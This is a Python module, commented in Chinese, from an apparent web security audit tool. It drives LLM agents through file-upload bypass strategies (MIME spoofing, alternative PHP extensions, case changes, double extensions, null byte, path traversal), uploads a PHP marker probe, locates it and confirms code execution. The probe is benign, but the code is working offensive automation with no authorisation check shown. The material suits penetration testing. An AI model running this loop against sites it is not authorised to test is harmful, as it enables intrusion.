"""
模块 4：Webshell 上传绕过与命令执行 (RCE) 验证 (LLM 决策 + 自动纠错循环 Agent 模式)

架构设计：
  1. Strategy Agent: 由 LLM 根据目标环境（URL、表单结构、accept限制）动态生成最佳绕过策略
  2. Request Executor: Python 构建精准的多部分表单 (multipart/form-data) 请求
  3. Path Analysis Agent: LLM 结合智能 DOM 差异对比解析重命名后的 Webshell 真实路径
  4. Diagnostic Agent & Self-Correction Loop: LLM 对 Webshell 响应进行漏洞诊断，若未解析或报错，自动提示纠错建议并进行下一轮重试
"""
import uuid
import urllib.parse
import re
import time
from typing import Dict, Any, List, Optional, Set
from pydantic import BaseModel, Field
from langchain_core.prompts import ChatPromptTemplate
from bs4 import BeautifulSoup

from web_audit.modules.base_module import BaseModule
from web_audit.core.requester import Requester
from web_audit.core.llm_factory import get_structured_llm


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# Pydantic 结构化输出模型
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

class BypassStrategyItem(BaseModel):
    name: str = Field(description="绕过策略名称，例如 'MIME Spoofing', 'PHTML Extension', 'Case Variation'")
    filename_suffix: str = Field(description="建议的文件后缀/扩展名（包含点号），例如 '.php', '.phtml', '.php5', '.phar', '.jpg.php', '.php%00.jpg'")
    content_type: str = Field(description="建议的 Content-Type 标头，例如 'image/jpeg', 'image/png', 'application/x-httpd-php'")
    rationale: str = Field(description="LLM 设计该策略的依据和推理")


class StrategyGenerationResult(BaseModel):
    strategies: List[BypassStrategyItem] = Field(
        description="由 LLM 为当前目标表单定制的 3 到 6 个绕过策略列表，按成功概率从高到低排序。"
    )


class ExtractPathResult(BaseModel):
    extracted_path: Optional[str] = Field(
        description="从上传响应或 DOM 内容中提取出的相对路径或绝对 URL。如果找不到路径则返回 null。",
        default=None
    )
    reason: str = Field(description="提取逻辑与依据说明")


class DiagnosticResult(BaseModel):
    status: str = Field(
        description="诊断状态类别，必须是以下之一: 'SUCCESS' (探针成功解析执行), 'PATH_404' (路径404错误/文件名变动), 'NOT_EXECUTED' (服务器未解析PHP，源码直接暴露/被当作纯文本或图片输出), 'WAF_BLOCKED' (被拦截), 'UNKNOWN' (其他)"
    )
    is_vuln: bool = Field(
        description="是否确凿证明存在安全漏洞（当且仅当探针标志被服务器动态引擎解析执行时为 True）"
    )
    explanation: str = Field(description="诊断依据和详细推理过程")
    recommended_action: str = Field(
        description="针对当前失败原因给出的自动纠错调整建议，例如 '建议更换 .phtml 后缀', '建议到列表页寻找重命名后的文件名'"
    )


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# LangChain Prompts
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

STRATEGY_GEN_PROMPT = ChatPromptTemplate.from_messages([
    ("system", """你是一个顶级 Web 安全专家，专注于文件上传漏洞与绕过测试。
你的任务是根据给定的上传接口信息，分析目标的防御机制（如前端 accept 限制、常见后端语言、中间件容器），动态定制一组最具针对性的绕过策略。

常用绕过思路提示：
1. **Direct Upload**: 基础直接上传 (.php)
2. **MIME Type Spoofing**: 将 Content-Type 伪造为 image/jpeg 或 image/png
3. **Alternative Extensions**: 备选可执行后缀 (.php3, .php5, .phtml, .phar, .inc)
4. **Case Obfuscation**: 大小写混合 (.PhP, .pHtml)
5. **Double Extensions**: 双后缀 (.jpg.php, .png.php)
6. **Null Byte / Path Traversal**: 截断或路径穿越 (../shell.php)

请输出 3 到 6 个结构化的策略组合。"""),
    ("human", """目标上传接口: {action_url}
表单文件字段名: {file_param}
前端声明允许的 accept 类型: {accept_types}
页面标题/上下文: {page_title}

请为该接口生成最有可能绕过防御的策略列表。""")
])


PATH_EXTRACT_PROMPT = ChatPromptTemplate.from_messages([
    ("system", """你是一个专业的安全分析助手。我刚在服务器上上传了一个名为 `{filename}` 的文件。
请从下面的 HTTP 响应体中（可能是 JSON, HTML, 或者是包含 JavaScript 的代码）寻找并提取出这个文件被存放在服务器上的最终访问路径。

提取原则：
1. 可能是一个直接的 URL (http://...)
2. 也可能是一个相对路径 (如 /uploads/shell.php, img/avatars/shell.jpg)
3. 或者是 JSON 字段中的路径，如 {{"status":"success", "url":"/uploads/123.php"}}
4. 如果响应只返回了成功但没有路径，或者返回了失败，请返回 null。"""),
    ("human", """响应状态码: {status_code}
文件名: {filename}

【服务器响应内容】:
{response_body}

请提取保存路径。""")
])


DIAGNOSTIC_PROMPT = ChatPromptTemplate.from_messages([
    ("system", """你是一个专业的 Web 漏洞诊断与自纠错智能体。
我们在目标服务器上通过文件上传提交了一个探针代码，探针包含原生打印标记 `VULN_VERIFIED_MARKER_UPLOAD`。
现在我们访问了推测的 Webshell 访问路径，请根据返回的 HTTP 响应，严格诊断当前状态：

🔥 **判断标准**:
1. **SUCCESS (漏洞确凿)**:
   - 响应中出现了 `VULN_VERIFIED_MARKER_UPLOAD` 标记，**且**前面没有 `<?php` 或 `<%` 等原始脚本标签。
   - 说明服务器代码解释器（如 PHP/ASP 引擎）成功解析并执行了探针，确认造成了任意代码执行/Webshell 漏洞！

2. **NOT_EXECUTED (代码未解析)**:
   - 响应中虽然出现了 `VULN_VERIFIED_MARKER_UPLOAD`，但同时依然能看到 `<?php` 或 `echo` 源码，说明文件被服务器当作纯文本或图片返回了，未能触发代码解析。
   - 建议：提示纠错模块更换更具兼容性的解析后缀（如 .phtml, .php5）。

3. **PATH_404 (路径错误)**:
   - 响应状态码为 404 或页面提示 File Not Found。说明文件落地路径推算错误，或者服务器对文件进行了重命名。
   - 建议：提示纠错模块从页面 DOM 差异或列表页中寻找新的文件名。

4. **WAF_BLOCKED (被拦截/拒绝)**:
   - 状态码 403/406 或页面提示安全拦截。

请给出严谨的诊断判定以及针对性的自纠错建议。"""),
    ("human", """尝试的 Payload 文件名: {filename}
访问的 Webshell URL: {webshell_url}
HTTP 状态码: {status_code}

【访问 Webshell 得到的响应内容】:
{response_text}

请分析诊断并给出结构化结果。""")
])


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# 主模块实现：LLM 决策 + 自动纠错循环
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

class UnifiedUploadAuditModule(BaseModule):
    name = "unified_upload_audit"

    def __init__(self, requester: Requester):
        super().__init__(requester)

        # 绑定结构化 LLM Chains
        self._strategy_chain = STRATEGY_GEN_PROMPT | get_structured_llm(StrategyGenerationResult)
        self._path_chain = PATH_EXTRACT_PROMPT | get_structured_llm(ExtractPathResult)
        self._diagnostic_chain = DIAGNOSTIC_PROMPT | get_structured_llm(DiagnosticResult)

        # PHP 无害探针标记
        self.webshell_content = b"<?php echo 'VULN_VERIFIED_MARKER_UPLOAD'; ?>"

    def run(self, url: str, context: Dict[str, Any] = None) -> Dict[str, Any]:
        result = self._base_result(url)
        upload_forms = (context or {}).get("upload_forms", [])

        if not upload_forms:
            result["summary"] = "上下文中没有提供任何上传端点信息"
            return result

        print(f"  [UploadAgent] 启动 LLM 智能决策与自纠错上传漏洞测试 Agent (端点数: {len(upload_forms)})...")

        for form_idx, form in enumerate(upload_forms, 1):
            action_url = form.get("action_url") or url
            file_params = form.get("file_input_names", [])
            file_param = file_params[0] if file_params else "file"
            accept_types = form.get("accepted_types", [])
            source_page = form.get("found_on_page") or form.get("source_url") or action_url

            print(f"\n  [{form_idx}/{len(upload_forms)}] 正在为端点 [{action_url}] 启动 Agent 决策链 (参数: '{file_param}')...")

            # ── 阶段 1: LLM 动态策略生成 ─────────────────────────────
            strategies = self._generate_llm_strategies(
                action_url=action_url,
                file_param=file_param,
                accept_types=accept_types,
                page_title=source_page
            )
            print(f"  [StrategyAgent] LLM 成功生成 {len(strategies)} 组针对性绕过策略。")

            # 准备多页面观察池（用于 DOM 差异对比寻址）
            observation_pages = self._build_observation_pages(source_page, url, action_url, form)
            baseline_links = self._collect_baseline_links(observation_pages)

            form_vulnerable = False

            # ── 阶段 2 & 3 & 4: LLM 决策执行 + 自纠错循环 ────────────
            for strat_idx, strategy in enumerate(strategies, 1):
                if form_vulnerable:
                    break  # 如果当前表单已经验证成功 RCE，停止尝试后续策略

                strat_name = strategy.name
                suffix = strategy.filename_suffix
                content_type = strategy.content_type
                filename = f"{uuid.uuid4().hex[:6]}_{strat_name.replace(' ', '_')}{suffix}"

                print(f"\n    → [Round {strat_idx}/{len(strategies)}] 执行策略: '{strat_name}' | 文件名: {filename} | Content-Type: {content_type}")
                print(f"       (依据: {strategy.rationale[:70]}...)")

                # 收集表单其他额外隐藏字段
                form_data = self._extract_extra_form_fields(source_page, action_url)

                # 发送物理上传请求
                resp = self._send_upload(action_url, file_param, filename, self.webshell_content, content_type, form_data)
                if not resp:
                    print(f"      [-] 上传请求未收到有效响应，跳过。")
                    continue

                # ── 尝试寻找 Webshell 真实路径 ────────────────────────
                path = self._extract_webshell_path(resp, filename, baseline_links, observation_pages, strat_name)

                if not path:
                    print(f"      [-] 均未能定位上传文件路径，进行下一次策略迭代。")
                    continue

                base_for_join = source_page or action_url or url
                webshell_url = urllib.parse.urljoin(base_for_join, path)
                print(f"      [+] 推演得到 Webshell 目标 URL: {webshell_url}")

                # ── 阶段 4: 访问 Webshell 并发起 LLM 诊断与自纠错 ────
                diag_result = self._verify_and_diagnose(webshell_url, filename)

                if not diag_result:
                    continue

                if diag_result.is_vuln or diag_result.status == "SUCCESS":
                    print(f"\n    🚨🚨 [AGENT 确认漏洞] 策略 '{strat_name}' 突破成功！探针已被动态引擎成功执行！🚨🚨")
                    print(f"    - 分析说明: {diag_result.explanation}")

                    result["findings"].append({
                        "url": action_url,
                        "strategy": strat_name,
                        "payload_file": filename,
                        "shell_path": webshell_url,
                        "rce_output": diag_result.explanation,
                        "severity": "Critical"
                    })
                    form_vulnerable = True
                    break
                else:
                    print(f"      [LLM 诊断状态: {diag_result.status}] {diag_result.explanation[:80]}")
                    print(f"      [💡 自纠错建议]: {diag_result.recommended_action}")

                    # 自动纠错机制：如果诊断提示路径 404，尝试去网络拦截器刷新寻找
                    if diag_result.status == "PATH_404" and form.get("referer_url"):
                        print(f"      [↺ 纠错重试] 尝试触发 Playwright 网络层拦截...")
                        net_urls = self.requester.fetch_network_resources(form.get("referer_url"))
                        for net_u in net_urls:
                            if filename.split("_")[0] in net_u or any(ext in net_u.lower() for ext in ['.php', '.phtml', '.php5', '.phar']):
                                retry_url = net_u
                                print(f"      [↺ 纠错重试] 发现网络层新路径，二次验证: {retry_url}")
                                retry_diag = self._verify_and_diagnose(retry_url, filename)
                                if retry_diag and (retry_diag.is_vuln or retry_diag.status == "SUCCESS"):
                                    print(f"\n    🚨🚨 [AGENT 自动纠错成功] 通过网络层捕获成功定位并解析 Webshell！🚨🚨")
                                    result["findings"].append({
                                        "url": action_url,
                                        "strategy": strat_name + " (Self-Correction via Network)",
                                        "payload_file": filename,
                                        "shell_path": retry_url,
                                        "rce_output": retry_diag.explanation,
                                        "severity": "Critical"
                                    })
                                    form_vulnerable = True
                                    break

        result["summary"] = f"LLM 上传漏洞测试完成。发现高危 Webshell/RCE 漏洞: {len(result['findings'])} 个。"
        return result

    # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    # 辅助方法与 Agent 环节实现
    # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

    def _generate_llm_strategies(self, action_url: str, file_param: str, accept_types: List[str], page_title: str) -> List[BypassStrategyItem]:
        """调用 Strategy Agent 动态生成最佳绕过策略。若 LLM 失败则退回基础备用策略。"""
        try:
            res: StrategyGenerationResult = self._strategy_chain.invoke({
                "action_url": action_url,
                "file_param": file_param,
                "accept_types": ", ".join(accept_types) if accept_types else "无限制",
                "page_title": page_title,
            })
            if res and res.strategies:
                return res.strategies
        except Exception as e:
            print(f"  [StrategyAgent] LLM 生成策略失败 ({e})，降级为默认策略库。")

        # 默认降级策略库
        return [
            BypassStrategyItem(name="Direct PHP", filename_suffix=".php", content_type="application/x-httpd-php", rationale="基础直接上传测试"),
            BypassStrategyItem(name="MIME Spoofing", filename_suffix=".php", content_type="image/jpeg", rationale="Content-Type 伪造为图片"),
            BypassStrategyItem(name="Alternative Ext PHTML", filename_suffix=".phtml", content_type="image/jpeg", rationale="常见可执行扩展名绕过"),
            BypassStrategyItem(name="Alternative Ext PHP5", filename_suffix=".php5", content_type="image/jpeg", rationale="PHP5 拓展名绕过"),
            BypassStrategyItem(name="Case Obfuscation", filename_suffix=".PhP", content_type="image/jpeg", rationale="后缀大小写变异"),
            BypassStrategyItem(name="Double Extension", filename_suffix=".jpg.php", content_type="image/jpeg", rationale="双重后缀绕过"),
        ]

    def _extract_webshell_path(self, resp: Any, filename: str, baseline_links: Set[str], observation_pages: List[str], strat_name: str) -> Optional[str]:
        """组合 LLM 响应分析、DOM 差异对比与兜底正则提取真实路径。"""
        path = None

        # 1. LLM 从上传响应中寻找路径
        if len(resp.text) >= 10:
            try:
                extract_res: ExtractPathResult = self._path_chain.invoke({
                    "filename": filename,
                    "status_code": resp.status_code,
                    "response_body": resp.text[:2000]
                })
                if extract_res and extract_res.extracted_path:
                    ep = extract_res.extracted_path.strip()
                    if "/" in ep or "." in ep:
                        print(f"      [LLM PathAgent] 从响应中解析出路径: {ep}")
                        return ep
            except Exception as e:
                pass

        # 2. 智能多页面 DOM 差异对比 (寻找上传后新增的资源链接)
        time.sleep(0.3)
        after_links = set()
        if resp.url and resp.url not in observation_pages:
            observation_pages.append(resp.url)

        for obs_page in observation_pages:
            try:
                html_text = self.requester.fetch_rendered_html(obs_page)
                if html_text:
                    after_links.update(self._extract_all_links(html_text))
            except Exception:
                pass

        path = self._find_best_shell_path(baseline_links, after_links, filename)
        if not path:
            path = self._find_fallback_shell_path(baseline_links, after_links, strat_name)

        if path:
            print(f"      [DOM Diff] 通过多页对比捕捉到新增资源: {path}")
            return path

        # 3. 正则兜底扫描
        try:
            core_name = filename.split("_")[0]
            match = re.search(r'[\'"]([^\'"]*' + re.escape(core_name) + r'[^\'"]*)[\'"]', resp.text)
            if match:
                path = match.group(1)
                print(f"      [Regex Fallback] 提取到关联文件名路径: {path}")
                return path
        except Exception:
            pass

        return None

    def _verify_and_diagnose(self, webshell_url: str, filename: str) -> Optional[DiagnosticResult]:
        """访问推算出的 Webshell URL，并交给 Diagnostic Agent 进行分析与诊断。"""
        try:
            resp = self.requester.get(webshell_url)
            if not resp:
                return DiagnosticResult(
                    status="PATH_404",
                    is_vuln=False,
                    explanation="访问 Webshell 目标 URL 无响应",
                    recommended_action="检查网络连通性或路径格式"
                )

            # 调用 Diagnostic Agent 进行语义诊断
            diag_res: DiagnosticResult = self._diagnostic_chain.invoke({
                "filename": filename,
                "webshell_url": webshell_url,
                "status_code": resp.status_code,
                "response_text": resp.text[:1500] if resp.text else "(Empty Body)"
            })
            return diag_res

        except Exception as e:
            print(f"      [-] Webshell 验证访问失败: {e}")
            return None

    def _send_upload(self, url: str, param: str, filename: str, content: bytes, content_type: str, data: Dict[str, str]):
        """执行物理上传 POST 请求。"""
        files = {param: (filename, content, content_type)}
        try:
            return self.requester.post(url, files=files, data=data)
        except Exception as e:
            print(f"      [-] 上传 POST 请求异常: {e}")
            return None

    def _extract_all_links(self, html_content: str) -> Set[str]:
        """提取 HTML 中的资源路径与正则表达式提取。"""
        links = set()
        if not html_content: return links
        soup = BeautifulSoup(html_content, "html.parser")
        for tag in soup.find_all(True):
            for attr in ["src", "href", "data-src", "data-url", "data-file"]:
                link = tag.get(attr)
                if link and isinstance(link, str):
                    links.add(link)
        pattern = r'[\'"](/[^ \'"<>\n]+\.[a-zA-Z0-9]+)[\'"]|[\'"](http[^\'"<>\n]+\.[a-zA-Z0-9]+)[\'"]'
        for match in re.findall(pattern, html_content):
            for m in match:
                if m: links.add(m)
        return links

    def _find_best_shell_path(self, before_links: Set[str], after_links: Set[str], original_filename: str) -> Optional[str]:
        """评分对比寻找最佳 Webshell 路径。"""
        new_links = after_links - before_links
        if not new_links: return None
        best_path, max_score = None, -1
        shell_extensions = ['.php', '.phtml', '.php3', '.php4', '.php5', '.phar', '.inc']
        upload_dirs = ['/uploads/', '/files/', '/tmp/', '/upload/', '/media/', '/images/', '/avatar/']
        for link in new_links:
            score = 0
            if original_filename.split("_")[0] in link: score += 10
            if any(ext in link.lower() for ext in shell_extensions): score += 5
            if any(ud in link.lower() for ud in upload_dirs): score += 3
            if score > max_score:
                max_score, best_path = score, link
        return best_path if max_score > 0 else None

    def _find_fallback_shell_path(self, before_links: Set[str], after_links: Set[str], strat_name: str) -> Optional[str]:
        """宽松兜底对比寻找可疑新增链接。"""
        new_links = after_links - before_links
        if not new_links: return None
        shell_extensions = ['.php', '.phtml', '.php3', '.php4', '.php5', '.phar']
        upload_dirs = ['/uploads/', '/files/', '/tmp/', '/upload/', '/media/']
        for link in new_links:
            if any(ext in link.lower() for ext in shell_extensions):
                return link
        for link in new_links:
            if any(ud in link.lower() for ud in upload_dirs):
                return link
        return None

    def _build_observation_pages(self, source_page: str, url: str, action_url: str, form: Dict[str, Any]) -> List[str]:
        """构建观察页面池。"""
        pages = set([source_page, url, action_url])
        if "?" in source_page:
            pages.add(source_page.split("?")[0])
        if form.get("referer_url"):
            pages.add(form.get("referer_url"))
        for page_url in [url, form.get("referer_url"), form.get("found_on_page")]:
            if page_url:
                parent_dir = urllib.parse.urljoin(page_url, ".")
                if parent_dir: pages.add(parent_dir)
        res = [p for p in pages if p]
        return res[:10]

    def _collect_baseline_links(self, observation_pages: List[str]) -> Set[str]:
        """获取 DOM 基线链接。"""
        baseline_links = set()
        for obs_page in observation_pages:
            try:
                html_text = self.requester.fetch_rendered_html(obs_page)
                if html_text:
                    baseline_links.update(self._extract_all_links(html_text))
            except Exception:
                pass
        return baseline_links

    def _extract_extra_form_fields(self, source_page: str, action_url: str) -> Dict[str, str]:
        """提取普通隐藏字段。"""
        form_data = {}
        try:
            resp = self.requester.get(source_page)
            if resp:
                soup = BeautifulSoup(resp.text, "html.parser")
                for f_tag in soup.find_all("form"):
                    if f_tag.get("action", "") in action_url or action_url in f_tag.get("action", ""):
                        for inp in f_tag.find_all("input"):
                            if inp.get("type", "text") != "file" and inp.get("name"):
                                form_data[inp["name"]] = inp.get("value", "test_val")
                        break
        except Exception:
            pass
        return form_data
